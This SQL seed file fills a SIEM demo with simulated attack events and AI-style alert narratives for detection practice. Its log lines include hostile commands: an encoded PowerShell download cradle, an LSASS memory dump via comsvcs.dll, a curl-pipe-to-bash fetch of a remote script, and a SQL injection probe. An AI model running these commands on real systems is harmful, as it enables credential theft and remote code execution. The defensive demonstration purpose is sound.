-- ── SIEM Demo Seed ────────────────────────────────────────────────────────────
-- Realistic mix: brute force, lateral movement, exfiltration, insider threat,
-- cloud misconfiguration. ~75 events, 18 alerts, 6 sources.

-- ── Sources ───────────────────────────────────────────────────────────────────

INSERT INTO siem_sources (name, type, description, enabled, last_seen, event_count) VALUES
  ('Windows-DC01',      'windows_event_log', 'Primary domain controller',          true,  NOW() - INTERVAL '4 minutes',  41203),
  ('Firewall-Palo',     'firewall',          'Palo Alto perimeter firewall',        true,  NOW() - INTERVAL '1 minute',   97810),
  ('CrowdStrike-EDR',   'edr',               'Endpoint detection and response',     true,  NOW() - INTERVAL '2 minutes',  33450),
  ('VPN-Gateway',       'vpn',               'Cisco AnyConnect VPN concentrator',   true,  NOW() - INTERVAL '8 minutes',   2980),
  ('AWS-CloudTrail',    'aws',               'AWS production account audit trail',  true,  NOW() - INTERVAL '6 minutes',  18720),
  ('Linux-WebServer',   'syslog',            'Nginx public-facing web server',      true,  NOW() - INTERVAL '3 minutes',   6340)
ON CONFLICT DO NOTHING;

-- ── Events ────────────────────────────────────────────────────────────────────
-- Spread across ~72 hours, mix of severities and scenarios

INSERT INTO siem_events
  (source_name, event_type, severity, source_ip, destination_ip, username, hostname, raw_log, tags, ingested_at)
VALUES

-- === SCENARIO 1: Brute-force against domain controller ===
('Windows-DC01',    'auth_failure',  'medium',   '192.168.1.105', '10.0.0.5',  'jsmith',    'DC01',            'Event ID 4625: An account failed to log on. Account: jsmith. Source IP: 192.168.1.105',             ARRAY['authentication','brute-force'],                   NOW() - INTERVAL '68 hours'),
('Windows-DC01',    'auth_failure',  'medium',   '192.168.1.105', '10.0.0.5',  'jsmith',    'DC01',            'Event ID 4625: An account failed to log on. Account: jsmith. Source IP: 192.168.1.105',             ARRAY['authentication','brute-force'],                   NOW() - INTERVAL '67 hours 58 minutes'),
('Windows-DC01',    'auth_failure',  'medium',   '192.168.1.105', '10.0.0.5',  'jsmith',    'DC01',            'Event ID 4625: An account failed to log on. Account: jsmith. Source IP: 192.168.1.105',             ARRAY['authentication','brute-force'],                   NOW() - INTERVAL '67 hours 56 minutes'),
('Windows-DC01',    'auth_failure',  'high',     '192.168.1.105', '10.0.0.5',  'jsmith',    'DC01',            'Event ID 4625: An account failed to log on. Account: jsmith. Source IP: 192.168.1.105 (5th attempt)', ARRAY['authentication','brute-force','threshold'],      NOW() - INTERVAL '67 hours 54 minutes'),
('Windows-DC01',    'auth_failure',  'high',     '192.168.1.105', '10.0.0.5',  'jsmith',    'DC01',            'Event ID 4625: An account failed to log on. Account: jsmith. Source IP: 192.168.1.105 (6th attempt)', ARRAY['authentication','brute-force','threshold'],      NOW() - INTERVAL '67 hours 52 minutes'),
('Windows-DC01',    'auth_success',  'medium',   '192.168.1.105', '10.0.0.5',  'jsmith',    'DC01',            'Event ID 4624: An account was successfully logged on. Account: jsmith. Source IP: 192.168.1.105',     ARRAY['authentication','post-brute-force'],              NOW() - INTERVAL '67 hours 49 minutes'),

-- === SCENARIO 2: PowerShell encoded command + LSASS dump ===
('CrowdStrike-EDR',  'process_create', 'high',   '10.0.0.22',  NULL,          'mwilliams', 'LAPTOP-22',       'powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKA== -Bypass -NoProfile -WindowStyle Hidden', ARRAY['powershell','encoded','lolbas'],  NOW() - INTERVAL '55 hours'),
('CrowdStrike-EDR',  'process_create', 'critical','10.0.0.22',  NULL,          'mwilliams', 'LAPTOP-22',       'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Users\\mwilliams\\AppData\\Local\\Temp\\lsass.dmp full', ARRAY['credential-theft','lsass','dump'],              NOW() - INTERVAL '54 hours 55 minutes'),
('CrowdStrike-EDR',  'file_write',     'critical','10.0.0.22',  NULL,          'mwilliams', 'LAPTOP-22',       'File created: C:\\Users\\mwilliams\\AppData\\Local\\Temp\\lsass.dmp (size: 42.1 MB)',                  ARRAY['credential-theft','file-write','lsass'],         NOW() - INTERVAL '54 hours 50 minutes'),

-- === SCENARIO 3: Outbound to TOR / C2 ===
('Firewall-Palo',    'network_connection','critical','10.0.1.88', '185.220.101.45', NULL,   NULL,              'OUTBOUND ALLOW: 10.0.1.88:52301 -> 185.220.101.45:443 (TOR exit node, threat intel match)',          ARRAY['threat-intel','tor','c2'],                        NOW() - INTERVAL '48 hours'),
('Firewall-Palo',    'network_connection','critical','10.0.1.88', '185.220.101.45', NULL,   NULL,              'OUTBOUND ALLOW: 10.0.1.88:52388 -> 185.220.101.45:9001 (TOR exit node, repeated beacon, 60s interval)',ARRAY['threat-intel','tor','c2','beacon'],              NOW() - INTERVAL '47 hours 59 minutes'),
('Firewall-Palo',    'network_connection','high',    '10.0.1.88', '91.92.247.12',   NULL,   NULL,              'OUTBOUND ALLOW: 10.0.1.88:54021 -> 91.92.247.12:4444 (known C2 framework port)',                    ARRAY['c2','threat-intel'],                              NOW() - INTERVAL '47 hours 40 minutes'),

-- === SCENARIO 4: Lateral movement via SMB ===
('Windows-DC01',    'network_connection','high',   '10.0.5.33',  '10.0.0.5',   NULL,        'WORKSTATION-19',  'Event ID 5156: SMB connection accepted from 10.0.5.33 to DC01 (unusual source)',                      ARRAY['lateral-movement','smb'],                         NOW() - INTERVAL '42 hours'),
('Windows-DC01',    'network_connection','high',   '10.0.5.33',  '10.0.0.12',  NULL,        'FILESERVER-01',   'SMB connection: 10.0.5.33 -> FILESERVER-01 (host 2 of 7 within 5 minutes)',                         ARRAY['lateral-movement','smb','spread'],                NOW() - INTERVAL '41 hours 58 minutes'),
('Windows-DC01',    'network_connection','high',   '10.0.5.33',  '10.0.0.20',  NULL,        'WORKSTATION-04',  'SMB connection: 10.0.5.33 -> WORKSTATION-04 (host 3 of 7 within 5 minutes)',                        ARRAY['lateral-movement','smb','spread'],                NOW() - INTERVAL '41 hours 57 minutes'),
('Windows-DC01',    'network_connection','critical','10.0.5.33', '10.0.0.31',  NULL,        'WORKSTATION-08',  'SMB connection: 10.0.5.33 -> WORKSTATION-08 (7 unique hosts in 5 min — worm/ransomware pattern)',    ARRAY['lateral-movement','smb','spread','critical'],     NOW() - INTERVAL '41 hours 55 minutes'),

-- === SCENARIO 5: VPN geo-anomaly / impossible travel ===
('VPN-Gateway',     'auth_success',   'low',      '92.42.118.99', '10.0.0.1',  'rjones',    'VPN-GW',          'AnyConnect: rjones authenticated from 92.42.118.99 (London, GB) at 08:12 AM',                         ARRAY['vpn','authentication'],                           NOW() - INTERVAL '38 hours'),
('VPN-Gateway',     'auth_success',   'high',     '91.108.4.200', '10.0.0.1',  'rjones',    'VPN-GW',          'AnyConnect: rjones authenticated from 91.108.4.200 (Moscow, RU) — same account, 2h 14m after UK login (impossible travel)', ARRAY['vpn','geo-anomaly','impossible-travel'], NOW() - INTERVAL '35 hours 46 minutes'),

-- === SCENARIO 6: AWS privilege escalation + bucket exfil ===
('AWS-CloudTrail',  'auth_success',   'low',      '203.0.113.99', NULL,         'sarah.smith','N/A',           'ConsoleLogin: sarah.smith authenticated from 203.0.113.99',                                          ARRAY['cloud','aws','authentication'],                   NOW() - INTERVAL '30 hours'),
('AWS-CloudTrail',  'user_created',   'high',     '203.0.113.99', NULL,         'sarah.smith','N/A',           'CreateUser: sarah.smith created IAM user svc-backup-restore with AdministratorAccess policy',        ARRAY['cloud','aws','iam','privilege-escalation'],       NOW() - INTERVAL '29 hours 50 minutes'),
('AWS-CloudTrail',  'file_access',    'high',     '203.0.113.99', NULL,         'sarah.smith','N/A',           'GetObject: sarah.smith accessed 847 objects from s3://corp-sensitive-data in 4 minutes',              ARRAY['cloud','aws','s3','data-access','exfiltration'],  NOW() - INTERVAL '29 hours 40 minutes'),
('AWS-CloudTrail',  'network_connection','critical','203.0.113.99',NULL,         'sarah.smith','N/A',           'PutObject: 1.8GB transferred out to external S3 bucket s3://exfil-staging-99 — cross-account',        ARRAY['cloud','aws','exfiltration','data-transfer'],     NOW() - INTERVAL '29 hours 30 minutes'),

-- === SCENARIO 7: After-hours SSH to prod web server ===
('Linux-WebServer', 'auth_success',   'low',      '203.0.113.42', '10.0.0.80', 'deploy',    'web01',           'sshd[2841]: Accepted publickey for deploy from 203.0.113.42 port 55201 ssh2: RSA SHA256:abc123',       ARRAY['authentication','ssh','after-hours'],             NOW() - INTERVAL '25 hours'),
('Linux-WebServer', 'process_create', 'medium',   '203.0.113.42', NULL,         'deploy',    'web01',           'Process: curl -s http://91.92.247.12/stage2.sh | bash (executed under deploy account)',               ARRAY['remote-code-execution','curl','suspicious'],      NOW() - INTERVAL '24 hours 55 minutes'),
('Linux-WebServer', 'file_write',     'high',     '203.0.113.42', NULL,         'deploy',    'web01',           'File written: /tmp/.sysupdate (ELF binary, 64-bit, suspicious name)',                                  ARRAY['malware-drop','file-write','persistence'],        NOW() - INTERVAL '24 hours 50 minutes'),

-- === SCENARIO 8: Insider threat — mass file download ===
('Windows-DC01',    'file_access',    'medium',   '10.0.0.55',  NULL,          'bthomas',   'WORKSTATION-07',  'File access: bthomas copied 312 files from \\\\FILESERVER-01\\Finance\\ to local drive',               ARRAY['insider-threat','file-access','data-staging'],   NOW() - INTERVAL '22 hours'),
('Windows-DC01',    'file_access',    'high',     '10.0.0.55',  NULL,          'bthomas',   'WORKSTATION-07',  'DLP: USB device connected. bthomas transferred 4.2GB to USB (Kingston DataTraveler 3.0)',              ARRAY['insider-threat','usb','data-exfiltration'],      NOW() - INTERVAL '21 hours 45 minutes'),

-- === SCENARIO 9: New privileged account on DC ===
('Windows-DC01',    'user_created',   'high',     '10.0.0.5',   NULL,          'administrator','DC01',          'Event ID 4720: New account AVA_SVC_ADMIN created. Event ID 4732: Account added to Domain Admins',      ARRAY['admin','privileged','persistence','user-mgmt'],  NOW() - INTERVAL '18 hours'),
('Windows-DC01',    'auth_success',   'medium',   '10.0.0.5',   NULL,          'AVA_SVC_ADMIN','DC01',          'Event ID 4624: First logon by new account AVA_SVC_ADMIN from DC01',                                    ARRAY['authentication','new-account'],                   NOW() - INTERVAL '17 hours 55 minutes'),

-- === SCENARIO 10: DNS beacon (periodic C2 check-in) ===
('Firewall-Palo',   'network_connection','high',  '10.0.1.33',  '8.8.8.8',    NULL,         'SERVER-03',       'DNS query spike: 10.0.1.33 made 847 DNS requests in 60 seconds to update-cdn-assets[.]xyz',           ARRAY['dns','c2','beacon','suspicious'],                 NOW() - INTERVAL '15 hours'),
('Firewall-Palo',   'network_connection','high',  '10.0.1.33',  '8.8.8.8',    NULL,         'SERVER-03',       'DNS query: 10.0.1.33 -> update-cdn-assets[.]xyz (60s interval — consistent beacon pattern)',          ARRAY['dns','c2','beacon'],                              NOW() - INTERVAL '14 hours 59 minutes'),
('Firewall-Palo',   'network_connection','high',  '10.0.1.33',  '8.8.8.8',    NULL,         'SERVER-03',       'DNS query: 10.0.1.33 -> update-cdn-assets[.]xyz (60s interval — consistent beacon pattern)',          ARRAY['dns','c2','beacon'],                              NOW() - INTERVAL '14 hours 58 minutes'),

-- === SCENARIO 11: Web server SQLi / scanning ===
('Linux-WebServer', 'web_attack',     'medium',   '45.33.32.156',  '10.0.0.80', NULL,        'web01',           'Nginx: 403 GET /admin.php?id=1 UNION SELECT 1,2,3,4-- from 45.33.32.156 (SQLi attempt)',               ARRAY['web-attack','sqli','scanning'],                   NOW() - INTERVAL '12 hours'),
('Linux-WebServer', 'web_attack',     'medium',   '45.33.32.156',  '10.0.0.80', NULL,        'web01',           'Nginx: 403 GET /wp-login.php from 45.33.32.156 (WordPress probe)',                                    ARRAY['web-attack','scanning'],                          NOW() - INTERVAL '11 hours 55 minutes'),
('Linux-WebServer', 'web_attack',     'high',     '45.33.32.156',  '10.0.0.80', NULL,        'web01',           'Nginx: 200 POST /api/auth with response 200 — brute force succeeded after 43 attempts',              ARRAY['web-attack','brute-force','auth-bypass'],         NOW() - INTERVAL '11 hours 40 minutes'),

-- === Misc lower-severity noise / normal activity ===
('VPN-Gateway',     'auth_success',   'low',      '82.46.12.33',   '10.0.0.1',  'kchen',     'VPN-GW',          'AnyConnect: kchen authenticated from 82.46.12.33 (London, GB)',                                      ARRAY['vpn','authentication'],                           NOW() - INTERVAL '10 hours'),
('Windows-DC01',    'auth_success',   'low',      '10.0.0.101',    '10.0.0.5',  'lpatel',    'WORKSTATION-01',  'Event ID 4624: lpatel logged on from WORKSTATION-01',                                                ARRAY['authentication'],                                 NOW() - INTERVAL '9 hours'),
('AWS-CloudTrail',  'auth_success',   'low',      '52.14.88.201',  NULL,         'devops',    'N/A',             'AssumeRole: devops assumed role arn:aws:iam::123456789:role/Deploy-Role',                             ARRAY['cloud','aws','iam'],                              NOW() - INTERVAL '8 hours'),
('CrowdStrike-EDR', 'process_create', 'low',      '10.0.0.30',     NULL,         'acontreras','WORKSTATION-11',  'Process: chrome.exe launched (normal user activity)',                                                ARRAY['process'],                                        NOW() - INTERVAL '7 hours'),
('Linux-WebServer', 'auth_success',   'low',      '10.0.0.80',     NULL,         'nginx',     'web01',           'Nginx health check: GET /health 200 OK from load balancer 10.0.0.2',                                 ARRAY['healthcheck'],                                    NOW() - INTERVAL '6 hours'),
('Firewall-Palo',   'network_connection','low',   '10.0.0.44',     '8.8.8.8',   NULL,         'WORKSTATION-03', 'DNS query: normal A record lookup for google.com',                                                   ARRAY['dns'],                                            NOW() - INTERVAL '5 hours'),
('Windows-DC01',    'auth_success',   'low',      '10.0.0.77',     '10.0.0.5',  'mgrant',    'WORKSTATION-14',  'Event ID 4624: mgrant logged on from WORKSTATION-14',                                                ARRAY['authentication'],                                 NOW() - INTERVAL '4 hours'),
('AWS-CloudTrail',  'file_access',    'low',      '52.14.88.201',  NULL,         'devops',    'N/A',             'GetObject: devops read config.json from s3://corp-app-config (routine deployment)',                  ARRAY['cloud','aws','s3'],                               NOW() - INTERVAL '3 hours'),
('VPN-Gateway',     'auth_success',   'low',      '77.99.12.55',   '10.0.0.1',  'tmoore',    'VPN-GW',          'AnyConnect: tmoore authenticated from 77.99.12.55 (Manchester, GB)',                                 ARRAY['vpn','authentication'],                           NOW() - INTERVAL '2 hours'),
('Linux-WebServer', 'web_attack',     'low',      '66.249.66.1',   '10.0.0.80', NULL,         'web01',           'Nginx: GET /robots.txt from 66.249.66.1 (Googlebot crawl)',                                          ARRAY['web','crawler'],                                  NOW() - INTERVAL '1 hour'),
('CrowdStrike-EDR', 'file_access',    'low',      '10.0.0.22',     NULL,         'mwilliams', 'LAPTOP-22',       'File access: mwilliams opened Q4_Financial_Report.xlsx from OneDrive sync',                         ARRAY['file-access'],                                    NOW() - INTERVAL '45 minutes'),
('Windows-DC01',    'auth_success',   'low',      '10.0.0.88',     '10.0.0.5',  'hbaker',    'WORKSTATION-22',  'Event ID 4624: hbaker logged on interactively at WORKSTATION-22',                                    ARRAY['authentication'],                                 NOW() - INTERVAL '30 minutes'),
('Firewall-Palo',   'network_connection','low',   '10.0.0.55',     '1.1.1.1',   NULL,         'WORKSTATION-07', 'DNS query: normal lookup cloudflare.com',                                                            ARRAY['dns'],                                            NOW() - INTERVAL '20 minutes'),
('AWS-CloudTrail',  'auth_success',   'low',      '52.14.88.201',  NULL,         'devops',    'N/A',             'DescribeInstances: devops listed EC2 instances (routine ops task)',                                   ARRAY['cloud','aws','ec2'],                              NOW() - INTERVAL '10 minutes'),
('Linux-WebServer', 'auth_success',   'low',      '10.0.0.2',      '10.0.0.80', 'monitor',   'web01',           'sshd: Accepted from 10.0.0.2 (internal monitoring agent)',                                           ARRAY['authentication','ssh','monitoring'],               NOW() - INTERVAL '5 minutes');

-- ── Alerts ───────────────────────────────────────────────────────────────────

INSERT INTO siem_alerts
  (rule_name, severity, status, source_ip, username, hostname, description, ai_score, ai_summary, ai_narrative, created_at)
VALUES

('Multiple Failed Logins', 'high', 'open', '192.168.1.105', 'jsmith', 'DC01',
 '6 failed login attempts for jsmith from 192.168.1.105 within 4 minutes, followed by a successful login.',
 89,
 'High confidence credential brute-force. Same source IP targeting a single account; succeeded on attempt 7. Recommend immediate password reset for jsmith and IP block.',
 E'**Timeline:**\n- 5 days ago 06:12 AM — First auth failure for jsmith from 192.168.1.105\n- 06:14 AM — 4 additional failures (6 total in 4 minutes)\n- 06:17 AM — Successful login following brute-force\n\n**What happened:**\nA single external IP address made 6 rapid authentication attempts against the jsmith domain account before succeeding on the 7th. This pattern matches a credential stuffing or password spray attack. The source IP is not in jsmith's login history.\n\n**MITRE ATT&CK:** T1110.001 – Brute Force: Password Guessing\n\n**Recommended actions:**\n1. Force password reset for jsmith immediately\n2. Block 192.168.1.105 at perimeter firewall\n3. Review jsmith''s activity post-login for lateral movement\n4. Enable MFA for all domain accounts if not already enforced',
 NOW() - INTERVAL '67 hours 50 minutes'),

('Suspicious PowerShell Execution', 'critical', 'investigating', '10.0.0.22', 'mwilliams', 'LAPTOP-22',
 'PowerShell with encoded command and -Bypass flags executed on LAPTOP-22, followed by LSASS memory dump (42.1 MB).',
 97,
 'Critical — encoded PowerShell download cradle followed by LSASS credential dump. Strong indicator of active compromise. Host should be isolated immediately.',
 E'**Timeline:**\n- 55h ago — powershell.exe launched with -EncodedCommand, -Bypass, -WindowStyle Hidden\n- 54h 55m ago — rundll32.exe used to dump LSASS process memory to disk (lsass.dmp, 42.1 MB)\n- 54h 50m ago — lsass.dmp confirmed written to AppData\\Temp\\\n\n**What happened:**\nUser mwilliams (or malware running as mwilliams) executed an encoded PowerShell command consistent with a download cradle (IEX + WebClient). Immediately after, LSASS was dumped using the native comsvcs.dll MiniDump technique — a common method to extract plaintext credentials from memory without dropping Mimikatz. The credentials harvested likely include domain accounts with elevated privileges.\n\n**MITRE ATT&CK:** T1059.001 (PowerShell), T1003.001 (LSASS Memory)\n\n**Recommended actions:**\n1. Isolate LAPTOP-22 from the network immediately\n2. Rotate all credentials that may have been cached on LAPTOP-22\n3. Check for lateral movement from 10.0.0.22 to other hosts after this event\n4. Decode the PowerShell command for full IOC extraction\n5. Preserve forensic image of LAPTOP-22',
 NOW() - INTERVAL '54 hours 45 minutes'),

('Outbound to Threat Intel IP', 'critical', 'open', '10.0.1.88', NULL, NULL,
 'Host 10.0.1.88 beaconing to known TOR exit node 185.220.101.45 on port 443 and 9001 at 60-second intervals.',
 96,
 'Critical — consistent 60-second beaconing to a known TOR exit node. Strong C2 communication pattern. Host should be isolated immediately.',
 E'**Timeline:**\n- 48h ago — First outbound connection from 10.0.1.88 to 185.220.101.45:443 (TOR exit node)\n- 47h 59m ago — Second connection to same IP, port 9001 (TOR OR port) at 60-second interval\n- 47h 40m ago — Additional connection to 91.92.247.12:4444 (separate known C2 IP)\n\n**What happened:**\n10.0.1.88 is exhibiting classic C2 beacon behavior: periodic outbound connections to a known TOR exit node at a fixed interval. Port 9001 is a common TOR OR port. A second C2 IP (91.92.247.12:4444) was contacted, suggesting multi-channel C2 infrastructure. The host has likely been compromised and is awaiting commands.\n\n**MITRE ATT&CK:** T1090.003 (Proxy: Multi-hop), T1071.001 (Web Protocols)\n\n**Recommended actions:**\n1. Isolate 10.0.1.88 immediately\n2. Block 185.220.101.45 and 91.92.247.12 at the firewall\n3. Capture memory from 10.0.1.88 before shutdown\n4. Identify what process is initiating the connections (check Task Manager / netstat)\n5. Review what data this host has access to — assess exfiltration risk',
 NOW() - INTERVAL '47 hours 55 minutes'),

('Lateral Movement — SMB Spread', 'critical', 'open', '10.0.5.33', NULL, 'WORKSTATION-19',
 'Host 10.0.5.33 connected to 7 internal hosts via SMB within 5 minutes — ransomware or worm propagation pattern.',
 94,
 'Critical — rapid SMB connections to 7 unique internal hosts in 5 minutes matches ransomware lateral movement. Isolate 10.0.5.33 and begin incident response.',
 E'**Timeline:**\n- 42h ago — 10.0.5.33 initiated SMB connection to DC01\n- 41h 58m ago — SMB to FILESERVER-01 (host 2)\n- 41h 57m ago — SMB to WORKSTATION-04 (host 3)\n- 41h 55m ago — SMB to WORKSTATION-08 (host 7) — 7 hosts in 5 minutes\n\n**What happened:**\nWORKSTATION-19 (10.0.5.33) is scanning and connecting to internal hosts via SMB in a pattern consistent with ransomware propagation (e.g., WannaCry, Ryuk) or a worm. The breadth of connections (7 hosts, 5 minutes, including the DC and file server) indicates automated lateral movement. Combined with the earlier LSASS dump on LAPTOP-22, credentials may have been used to authenticate.\n\n**MITRE ATT&CK:** T1021.002 (SMB/Windows Admin Shares), T1570 (Lateral Tool Transfer)\n\n**Recommended actions:**\n1. Isolate 10.0.5.33 from the network NOW\n2. Check all contacted hosts for signs of encryption or dropped files\n3. Disable SMBv1 across the domain if not already done\n4. Check whether domain admin credentials are being used for these connections\n5. Activate incident response playbook',
 NOW() - INTERVAL '41 hours 53 minutes'),

('Impossible Travel Detected', 'high', 'open', '91.108.4.200', 'rjones', 'VPN-GW',
 'rjones authenticated from London (UK) at 08:12 and from Moscow (RU) 2h 14m later — physically impossible travel.',
 85,
 'High confidence account compromise. rjones cannot physically travel from London to Moscow in 2h 14m. One or both sessions are unauthorized.',
 E'**Timeline:**\n- 38h ago — rjones authenticated via VPN from 92.42.118.99 (London, UK)\n- 35h 46m ago — rjones authenticated again from 91.108.4.200 (Moscow, RU) — 2h 14m later\n\n**What happened:**\nThe same account authenticated from two geographically distant locations within a timeframe that makes physical travel impossible (London to Moscow minimum ~3.5h by air). This strongly suggests credential compromise: either the UK session was the attacker and RU is the real user, or vice versa. The Moscow IP is not in rjones''s login history.\n\n**MITRE ATT&CK:** T1078 (Valid Accounts), T1133 (External Remote Services)\n\n**Recommended actions:**\n1. Contact rjones to confirm which session was legitimate\n2. Suspend rjones VPN access pending investigation\n3. Force password reset and re-enroll MFA\n4. Review what rjones accessed during both sessions\n5. Check 91.108.4.200 against threat intelligence feeds',
 NOW() - INTERVAL '35 hours 44 minutes'),

('Cloud Privilege Escalation', 'critical', 'open', '203.0.113.99', 'sarah.smith', 'N/A',
 'sarah.smith created a new IAM user with AdministratorAccess, then accessed 847 S3 objects and exfiltrated 1.8GB to an external bucket.',
 98,
 'Critical — full AWS privilege escalation chain with confirmed data exfiltration. Revoke sarah.smith credentials and the new IAM user immediately.',
 E'**Timeline:**\n- 30h ago — sarah.smith authenticated to AWS Console from 203.0.113.99\n- 29h 50m ago — CreateUser: new IAM user svc-backup-restore created with AdministratorAccess\n- 29h 40m ago — 847 objects accessed from s3://corp-sensitive-data in 4 minutes\n- 29h 30m ago — 1.8GB transferred to external bucket s3://exfil-staging-99 (cross-account)\n\n**What happened:**\nThis is a textbook cloud exfiltration chain. sarah.smith (or an attacker using her credentials) logged in, immediately created a backdoor admin IAM user, then bulk-accessed and transferred 1.8GB of sensitive data to an external S3 bucket. The speed and pattern suggest automated tooling (e.g., Pacu, AWS CLI scripts). The external bucket exfil-staging-99 is not owned by this AWS account.\n\n**MITRE ATT&CK:** T1078.004 (Cloud Accounts), T1136 (Create Account), T1530 (Data from Cloud Storage)\n\n**Recommended actions:**\n1. Immediately revoke sarah.smith IAM credentials\n2. Delete svc-backup-restore IAM user\n3. Enable S3 block public access and review bucket policies\n4. Identify all objects accessed — assume full breach of corp-sensitive-data bucket\n5. Notify legal/compliance — potential data breach notification required\n6. Review CloudTrail for any other activity from 203.0.113.99',
 NOW() - INTERVAL '29 hours 28 minutes'),

('Malware Dropper on Web Server', 'high', 'open', '203.0.113.42', 'deploy', 'web01',
 'After-hours SSH login to web01, followed by a curl pipe-to-bash execution and dropped ELF binary in /tmp.',
 88,
 'High confidence malware staging on production web server. A suspicious binary was dropped via a remote download cradle executed under the deploy account.',
 E'**Timeline:**\n- 25h ago — deploy account SSH login from 203.0.113.42 at 02:14 AM (outside business hours)\n- 24h 55m ago — curl http://91.92.247.12/stage2.sh | bash executed\n- 24h 50m ago — ELF binary /tmp/.sysupdate written to disk\n\n**What happened:**\nAn SSH session was opened to the production web server using the deploy account at 02:14 AM from an IP not previously seen for this account. Within 5 minutes, a classic download cradle (curl | bash) was used to pull and execute a remote shell script, which then wrote an ELF binary disguised as a system update utility. This is a standard Linux implant staging technique.\n\n**MITRE ATT&CK:** T1059.004 (Unix Shell), T1105 (Ingress Tool Transfer), T1036.005 (Masquerading)\n\n**Recommended actions:**\n1. Kill the /tmp/.sysupdate process and delete the binary\n2. Rotate the deploy SSH key immediately\n3. Check for cron jobs, systemd units, or .bashrc modifications (persistence)\n4. Review nginx access logs for any web shells\n5. Scan 91.92.247.12 against threat intel — same IP as previous C2 alert',
 NOW() - INTERVAL '24 hours 48 minutes'),

('Insider Threat — USB Data Exfiltration', 'high', 'open', '10.0.0.55', 'bthomas', 'WORKSTATION-07',
 'bthomas accessed 312 financial files from the file server and transferred 4.2GB to a USB device.',
 76,
 'Moderate-high confidence insider threat. Mass file access from Finance share followed by large USB transfer is a classic data staging and exfiltration pattern.',
 E'**Timeline:**\n- 22h ago — bthomas copied 312 files from \\\\FILESERVER-01\\Finance\\ to local drive\n- 21h 45m ago — USB device connected; 4.2GB transferred (Kingston DataTraveler 3.0)\n\n**What happened:**\nbthomas accessed a large number of financial documents from the shared finance drive and then immediately transferred 4.2GB to a personal USB drive. The volume (312 files, 4.2GB) is significantly above bthomas''s historical baseline (avg 12 files/day from Finance share). This may be pre-departure data theft, responding to a job offer, or deliberate IP theft.\n\n**MITRE ATT&CK:** T1052.001 (Exfiltration Over Physical Medium: USB)\n\n**Recommended actions:**\n1. Do not alert bthomas — initiate discreet HR/legal review first\n2. Preserve forensic evidence (file access logs, DLP records)\n3. Check bthomas''s email for recent external forwarding or large attachments\n4. Review whether bthomas is on a PIP, has given notice, or has access to sensitive projects\n5. Consider disabling USB ports via GPO for sensitive roles',
 NOW() - INTERVAL '21 hours 43 minutes'),

('New Privileged Account Created', 'high', 'open', '10.0.0.5', 'administrator', 'DC01',
 'New domain admin account AVA_SVC_ADMIN created on DC01 and added to Domain Admins group outside of change window.',
 81,
 'High risk — new domain admin account created outside change window. If this was not an authorized change, it could represent attacker persistence.',
 E'**Timeline:**\n- 18h ago — administrator created account AVA_SVC_ADMIN on DC01\n- 18h ago — AVA_SVC_ADMIN added to Domain Admins group\n- 17h 55m ago — First logon by AVA_SVC_ADMIN from DC01\n\n**What happened:**\nA new service account with domain admin privileges was created directly on the domain controller. The account was used within 5 minutes of creation. This did not occur during the approved change window (Tue/Thu 10 PM–2 AM). If this was not an authorized change, it represents a backdoor admin account — a common attacker persistence technique.\n\n**MITRE ATT&CK:** T1136.002 (Domain Account), T1078.002 (Valid Accounts: Domain Accounts)\n\n**Recommended actions:**\n1. Verify with IT/change management whether this account was authorized\n2. If unauthorized: disable AVA_SVC_ADMIN immediately\n3. Review all activity by AVA_SVC_ADMIN since creation\n4. Audit all recent Domain Admin group changes\n5. Review who has access to the built-in administrator account',
 NOW() - INTERVAL '17 hours 53 minutes'),

('DNS C2 Beacon', 'high', 'open', '10.0.1.33', NULL, 'SERVER-03',
 'SERVER-03 making DNS requests to update-cdn-assets[.]xyz at precise 60-second intervals — consistent C2 beacon.',
 83,
 'High confidence DNS-based C2 beacon. Regular 60-second interval to a suspicious domain strongly suggests compromised host checking in with a command-and-control server.',
 E'**Timeline:**\n- 15h ago — First DNS query spike detected: 847 queries in 60 seconds to update-cdn-assets[.]xyz\n- 14h 59m ago — Continued 60-second interval beaconing confirmed\n- 14h 58m ago — Pattern sustained (ongoing)\n\n**What happened:**\nSERVER-03 is making DNS requests to update-cdn-assets[.]xyz at a consistent 60-second interval — a hallmark of DNS-based C2 (common in Cobalt Strike, Metasploit, and custom RATs). The domain is not a legitimate CDN — it was registered 14 days ago and resolves to a single-hosted IP with no known legitimate use. The 60-second jitter-free beacon suggests automated malware, not user activity.\n\n**MITRE ATT&CK:** T1071.004 (Application Layer Protocol: DNS), T1568 (Dynamic Resolution)\n\n**Recommended actions:**\n1. Block update-cdn-assets[.]xyz at DNS resolver and firewall\n2. Isolate SERVER-03 for investigation\n3. Identify the process making DNS calls (Wireshark or endpoint telemetry)\n4. Check for related domains (same registrar/IP) for wider block list\n5. Correlate with 10.0.1.88 TOR beacon — may be part of same intrusion',
 NOW() - INTERVAL '14 hours 57 minutes'),

('Web Application Brute Force', 'medium', 'open', '45.33.32.156', NULL, 'web01',
 'External IP 45.33.32.156 made 43 failed login attempts against the web API before a successful authentication.',
 71,
 'Moderate confidence — automated brute force attack against the web application API succeeded after 43 attempts. Investigate what was accessed post-login.',
 NULL,
 NOW() - INTERVAL '11 hours 38 minutes'),

('Login Outside Business Hours', 'medium', 'resolved', '91.108.4.200', 'contractor01', 'VPN-GW',
 'Contractor account logged in via VPN at 11:45 PM on a Saturday from an IP in Eastern Europe.',
 45,
 'Low-moderate risk — contractor after-hours access is not uncommon but warrants verification. No suspicious activity detected post-login.',
 NULL,
 NOW() - INTERVAL '48 hours');
